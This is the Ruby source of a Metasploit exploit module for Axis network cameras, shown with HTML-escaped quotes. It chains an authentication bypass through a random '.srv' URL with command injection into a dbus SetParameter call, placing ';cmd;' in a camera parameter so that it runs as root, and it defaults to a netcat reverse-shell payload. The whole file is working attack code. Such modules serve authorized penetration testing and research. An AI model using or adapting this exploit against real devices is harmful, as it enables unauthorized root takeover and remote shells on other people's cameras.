# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote

  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  #include Msf::Exploit::CmdStager

  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;           => &#039;Axis Network Camera .srv to parhand RCE&#039;,
      &#039;Description&#039;    => %q{
        This module exploits an auth bypass in .srv functionality and a
        command injection in parhand to execute code as the root user.
      },
      &#039;Author&#039;         => [
        &#039;Or Peles&#039;,       # Vulnerability discovery (VDOO)
        &#039;wvu&#039;,            # Metasploit module
        &#039;sinn3r&#039;,         # Metasploit module
        &#039;Brent Cook&#039;,     # Metasploit module
        &#039;Jacob Robles&#039;,   # Metasploit module
        &#039;Matthew Kienow&#039;, # Metasploit module
        &#039;Shelby Pace&#039;,    # Metasploit module
        &#039;Chris Lee&#039;,      # Metasploit module
        &#039;Cale Black&#039;      # Metasploit module
      ],
      &#039;References&#039;     => [
        [&#039;CVE&#039;, &#039;2018-10660&#039;],
        [&#039;CVE&#039;, &#039;2018-10661&#039;],
        [&#039;CVE&#039;, &#039;2018-10662&#039;],
        [&#039;URL&#039;, &#039;https://blog.vdoo.com/2018/06/18/vdoo-discovers-significant-vulnerabilities-in-axis-cameras/&#039;],
        [&#039;URL&#039;, &#039;https://www.axis.com/files/faq/Advisory_ACV-128401.pdf&#039;]
      ],
      &#039;DisclosureDate&#039; => &#039;Jun 18 2018&#039;,
      &#039;License&#039;        => MSF_LICENSE,
      &#039;Platform&#039;       => [&#039;unix&#039;],# &#039;linux&#039;],
      &#039;Arch&#039;           => [ARCH_CMD],# ARCH_ARMLE],
      &#039;Privileged&#039;     => true,
      &#039;Targets&#039;        => [
        [&#039;Unix In-Memory&#039;,
         &#039;Platform&#039;    => &#039;unix&#039;,
         &#039;Arch&#039;        => ARCH_CMD,
         &#039;Type&#039;        => :unix_memory,
         &#039;Payload&#039;     => {
           &#039;BadChars&#039;  => &#039; &#039;,
           &#039;Encoder&#039;   => &#039;cmd/ifs&#039;,
           &#039;Compat&#039;    => {&#039;PayloadType&#039; => &#039;cmd&#039;, &#039;RequiredCmd&#039; => &#039;netcat-e&#039;}
         }
        ],
=begin
        [&#039;Linux Dropper&#039;,
         &#039;Platform&#039;    => &#039;linux&#039;,
         &#039;Arch&#039;        => ARCH_ARMLE,
         &#039;Type&#039;        => :linux_dropper
        ]
=end
      ],
      &#039;DefaultTarget&#039;  => 0,
      &#039;DefaultOptions&#039; => {&#039;PAYLOAD&#039; => &#039;cmd/unix/reverse_netcat_gaping&#039;}
    ))
  end

  def exploit
    case target[&#039;Type&#039;]
    when :unix_memory
      execute_command(payload.encoded)
=begin
    when :linux_dropper
      execute_cmdstager
=end
    end
  end

  def execute_command(cmd, opts = {})
    rand_srv = "#{Rex::Text.rand_text_alphanumeric(8..42)}.srv"

    send_request_cgi(
      &#039;method&#039;    => &#039;POST&#039;,
      &#039;uri&#039;       => "/index.html/#{rand_srv}",
      &#039;vars_post&#039; => {
        &#039;action&#039;  => &#039;dbus&#039;,
        &#039;args&#039;    => dbus_send(
          method: :set_param,
          param:  "string:root.Time.DST.Enabled string:;#{cmd};"
        )
      }
    )

    send_request_cgi(
      &#039;method&#039;    => &#039;POST&#039;,
      &#039;uri&#039;       => "/index.html/#{rand_srv}",
      &#039;vars_post&#039; => {
        &#039;action&#039;  => &#039;dbus&#039;,
        &#039;args&#039;    => dbus_send(method: :synch_params)
      }
    )
  end

  def dbus_send(method:, param: nil)
    args = &#039;--system --dest=com.axis.PolicyKitParhand &#039; \
           &#039;--type=method_call /com/axis/PolicyKitParhand &#039;

    args <<
      case method
      when :set_param
        "com.axis.PolicyKitParhand.SetParameter #{param}"
      when :synch_params
        &#039;com.axis.PolicyKitParhand.SynchParameters&#039;
      end

    args
  end

end

